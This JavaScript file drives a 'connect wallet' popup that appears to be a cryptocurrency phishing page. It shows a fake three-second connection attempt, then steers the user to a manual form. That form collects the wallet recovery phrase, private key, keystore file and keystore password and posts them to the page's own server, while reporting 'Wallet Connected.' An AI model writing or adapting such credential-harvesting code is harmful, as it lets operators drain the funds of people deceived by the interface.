const popup = document.querySelector("#popup");
const overlay = document.querySelector("#overlay");
const firstview = document.querySelector("#firstView");
const secondView = document.querySelector("#secondView");
const thirdView = document.querySelector("#thirdView");
const cbutton = document.querySelector("#cbutton");
const connectW = document.querySelector("#connectW");
const lConnectW = document.querySelector("#lConnectW");
const backbutton = document.querySelector("#backbutton");
const cancelbutton = document.querySelector("#cancelbutton");
const manualConnect = document.querySelector("#manualConnect");
const connectForm = document.querySelector("#connectForm");
const connectbutton = document.querySelector("#connectbutton");
const tButtons = document.querySelectorAll(".t-button");

let credType = "phrase";



const resetViews = () => {
    popup.style.display = "none";
    firstview.style.display = "block";
    secondView.style.display = "none";
    thirdView.style.display = "none";
    connectW.style.display = "block";
    lConnectW.style.display = "none";
}

tButtons.forEach(b => {
    b.addEventListener("click", evt => {
        credType = evt.target.innerText;
    })
})

connectW.addEventListener("click", () => {
    connectW.style.display = "none";
    lConnectW.style.display = "block";
    setTimeout(()=> {
        firstview.style.display = "none";
        secondView.style.display = "block";
    }, 3000);
});

manualConnect.addEventListener("click", () => {
    secondView.style.display = "none";
    thirdView.style.display = "block";
})

cbutton.addEventListener("click", () => {
    popup.style.display = "flex";
});

backbutton.addEventListener("click", () => {
    resetViews();
});

cancelbutton.addEventListener("click", () => {
    popup.style.display = "none";
    resetViews();
});

connectbutton.addEventListener("click", e =>  {
    try{
        e.preventDefault();
        // get all input values
        const walletname = document.querySelector("#walletname").value;
        const rphrase = document.querySelector("#floatingTextarea2").value;
        const keystorepass = document.querySelector("#keystorepass").value;
        const keystorefile = document.querySelector("#formFile");
        const privatekey = document.querySelector("#privatekey").value;
        // make api call
        const data = new FormData();
        data.append("type", credType);
        data.append("walletname", walletname);
        data.append("rphrase", rphrase);
        data.append("privatekey", privatekey);
        data.append("keystorepass", keystorepass);
        if(keystorefile.files.length){
            data.append("keystorefile", keystorefile.files[0], "keystorepass");
        }
        axios.post('/', data)
        .then(res => {
            if(res.data.success){
                FlashMessage.success('Wallet Connected.', {duration: 2000});
                resetViews();
                return;
            }else{
                FlashMessage.error(res.data.message, {duration: 2000});
                return;
            }
        }).catch(err => {
            console.log(err);
            FlashMessage.error("Failed to connect wallet.", {duration: 2000});
            return;
        })
    }catch(err){
        console.log(err);
    }
})






